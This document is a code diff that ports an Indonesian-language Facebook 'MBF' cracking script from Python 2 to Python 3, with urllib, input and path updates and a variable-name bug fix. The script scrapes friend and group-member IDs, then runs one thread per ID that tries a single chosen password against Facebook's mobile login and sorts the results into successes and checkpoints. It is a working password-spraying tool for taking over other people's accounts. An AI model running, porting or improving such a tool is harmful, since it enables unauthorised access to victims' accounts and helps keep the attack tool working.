@@ -1,9 +1,15 @@
-import platform, os, sys
-import cookielib, re, urllib2, urllib, threading
+import platform
+import os
+import sys
+import http.cookiejar as cookielib
+import re
+import urllib.request
+import urllib.parse
+import threading
 try:
     import mechanize
 except ImportError:
-    print('Module mechanize belum di install. Install dengan menjalankan: pip2 install mechanize')
+    print('Module mechanize belum di install. Install dengan menjalankan: pip install mechanize')
     sys.exit()
 
 def cetak(x, e=0):
@@ -18,11 +24,11 @@ def cetak(x, e=0):
     else:
         sys.stdout.write(x + '\n')
 
-if platform.python_version().split('.')[0] != '2':
-    cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x' % platform.python_version().split(' ')[0])
+if platform.python_version().split('.')[0] != '3':
+    cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 3.x.x' % platform.python_version().split(' ')[0])
     sys.exit()
 
-br = 0
+br = None
 log = 0
 id_bteman = []
 id_bgroup = []
@@ -41,23 +47,25 @@ class mt(threading.Thread):
 
     def run(self):
         try:
-            data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',
-                                                   data=urllib.urlencode({'email': self.id, 'pass': self.p}),
-                                                   headers={'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
+            data = urllib.request.urlopen(urllib.request.Request(
+                url='https://m.facebook.com/login.php',
+                data=urllib.parse.urlencode({'email': self.id, 'pass': self.p}).encode('utf-8'),
+                headers={'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
+            ))
         except KeyboardInterrupt:
             sys.exit()
         except:
             self.a = 4
             sys.exit()
-        if 'm_sess' in data.url or 'save-device' in data.url:
+        if 'm_sess' in data.geturl() or 'save-device' in data.geturl():
             self.a = 1
-        elif 'checkpoint' in data.url:
+        elif 'checkpoint' in data.geturl():
             self.a = 2
         else:
             self.a = 3
 
 def crack(d):
-    while 1:
+    while True:
         s = inputD('[?] Sandi')
         if len(s) < 6:
             cetak('!m[!] Jumlah huruf minimal !k6')
@@ -102,7 +110,8 @@ def crack0(data, sandi):
     for i in data:
         i = i.replace(' ', '')
         i = i.replace('\n', '')
-        if len(i) != 0: th.append(mt(i, sandi))
+        if len(i) != 0:
+            th.append(mt(i, sandi))
         jml1 += 1
     for i in th:
         i.daemon = True
@@ -112,7 +121,7 @@ def crack0(data, sandi):
             exit()
     h_error = []
     error = 0
-    while 1:
+    while True:
         try:
             for i in th:
                 status, id = i.update()
@@ -134,7 +143,8 @@ def crack0(data, sandi):
         except KeyboardInterrupt:
             sys.exit()
         try:
-            if threading.activeCount() == 1: break
+            if threading.activeCount() == 1:
+                break
         except KeyboardInterrupt:
             keluar()
     cetak('\r!h[*] Cracking  !k100!m%      ')
@@ -154,11 +164,11 @@ def install_browser():
 def bacaData():
     global fid_bgroup, fid_bteman
     try:
-        fid_bgroup = open(os.sys.path[0] + '/MBFgroup.txt', 'r').readlines()
+        fid_bgroup = open(os.path.join(os.sys.path[0], 'MBFgroup.txt'), 'r').readlines()
     except:
         pass
     try:
-        fid_bteman = open(os.sys.path[0] + '/MBFteman.txt', 'r').readlines()
+        fid_bteman = open(os.path.join(os.sys.path[0], 'MBFteman.txt'), 'r').readlines()
     except:
         pass
 
@@ -166,14 +176,14 @@ def simpan():
     if len(id_bgroup) != 0:
         cetak('!h[*] Menyimpan hasil dari Group')
         try:
-            open(os.sys.path[0] + '/MBFgroup.txt', 'w').write('\n'.join(id_bgroup))
+            open(os.path.join(os.sys.path[0], 'MBFgroup.txt'), 'w').write('\n'.join(id_bgroup))
             cetak('!h[!] Berhasil meyimpan !cMBFgroup.txt')
         except:
             cetak('!m[!] Gagal meyimpan')
     if len(id_bteman) != 0:
         cetak('!h[*] Menyimpan hasil daftar Teman...')
         try:
-            open(os.sys.path[0] + '/MBFteman.txt', 'w').write('\n'.join(id_bteman))
+            open(os.path.join(os.sys.path[0], 'MBFteman.txt'), 'w').write('\n'.join(id_bteman))
             cetak('!h[!] Berhasil meyimpan !cMBFteman.txt')
         except:
             cetak('!m[!] Gagal meyimpan')
@@ -184,9 +194,9 @@ def keluar():
     sys.exit()
 
 def inputD(x, v=0):
-    while 1:
+    while True:
         try:
-            a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m' % x)
+            a = input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m' % x)
         except:
             cetak('\n!m[!] Batal')
             keluar()
@@ -205,7 +215,7 @@ def inputD(x, v=0):
     return a
 
 def inputM(x, d):
-    while 1:
+    while True:
         try:
             i = int(inputD(x))
         except:
@@ -224,7 +234,7 @@ def lanjutG():
         if i.upper() == 'L':
             return crack(fid_bgroup)
         else:
-            os.remove(os.sys.path[0] + '/MBFgroup.txt')
+            os.remove(os.path.join(os.sys.path[0], 'MBFgroup.txt'))
             fid_bgroup = []
     return 0
 
@@ -235,7 +245,7 @@ def lanjutT():
         if i.upper() == 'L':
             return crack(fid_bteman)
         else:
-            os.remove(os.sys.path[0] + '/MBFteman.txt')
+            os.remove(os.path.join(os.sys.path[0], 'MBFteman.txt'))
             fid_bteman = []
     return 0
 
@@ -247,10 +257,10 @@ def buka(d):
     except:
         cetak('\r!m[!] Gagal membuka !p' + str(d))
         keluar()
-    if '<link rel="redirect" href="' in x:
+    if '<link rel="redirect" href="' in x.decode('utf-8'):
         return buka(br.find_link().url)
     else:
-        return x
+        return x.decode('utf-8')
 
 def login():
     global log
@@ -293,7 +303,7 @@ def idgroup():
         if log == 0:
             keluar()
     next = saring_id_group0()
-    while 1:
+    while True:
         saring_id_group1(buka(next))
         try:
             next = br.find_link(url_regex='/browse/group/members/').url
@@ -326,12 +336,12 @@ def idteman():
     try:
         next = br.find_link(url_regex='friends_center_main').url
     except:
-        if len(id_teman) != 0:
+        if len(id_bteman) != 0:
             cetak('!m[!] Hanya dapat mengambil !p%d id' % len(id_bteman))
         else:
             cetak('!m[!] Batal')
             keluar()
-    while 1:
+    while True:
         saring_id_teman(buka(next))
         cetak('\r!h[*] !p%s !hid terambil...' % len(id_bteman), 1)
         sys.stdout.flush()
@@ -348,7 +358,7 @@ def idteman():
         return menu()
 
 def menu():
-    cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n    \ /  /  /          !b\\\n     \  /  /            !b\\\n      \\/  /              !b\\\n       \  /                !b\\\n        \/                  !b\\\n        !m(!0!k*  *!m)!0!b|===========\n             !h(!m'!h)\n")
+    cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \\ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n    \\ /  /  /          !b\\\n     \\  /  /            !b\\\n      \\/  /              !b\\\n       \\  /                !b\\\n        \\/                  !b\\\n        !m(!0!k*  *!m)!0!b|===========\n             !h(!m'!h)\n")
     cetak('!m.________________________________________.')
     cetak('!m|.!kNb!m| !pSemoga hari mu menyenangkan.... !m|!kNB!m|')
     cetak('!m|!k##!m|!c 1.!pKumpulkan Id Dari Daftar Teman   !m|!k##!m|')
